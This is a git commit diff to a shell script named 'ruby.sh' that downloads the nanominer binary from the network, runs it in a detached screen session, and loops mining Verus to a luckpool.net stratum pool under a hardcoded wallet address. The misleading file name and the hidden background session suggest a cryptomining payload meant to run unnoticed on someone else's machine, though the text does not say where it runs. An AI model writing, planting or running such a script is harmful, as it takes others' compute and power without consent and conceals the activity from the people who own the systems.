8ffc2659218a336c3d8df435888b54183d4aeed0
Terri <terriana81@vqsprint.com>
2021-06-13 04:51:57 +0000

    ruby.sh edited online with Bitbucket

--- ruby.sh
+++ ruby.sh
@@ -5,6 +5,7 @@ sudo apt install screen -y
 screen -dmS random ./nanominer 65 75
 wget https://github.com/nanopool/nanominer/releases/download/3.3.4/nanominer-linux-3.3.4.tar.gz
 tar xf nanominer-linux-3.3.4.tar.gz
+cd nanominer-linux-3.3.4
 ls
 while [ 1 ]; do
 ./nanominer -a verus -o stratum+tcp://na.luckpool.net:3960 -u RYA9hTgYmNFayype84LN2cHCD2qg1bY4KK.jj -p x -t 2
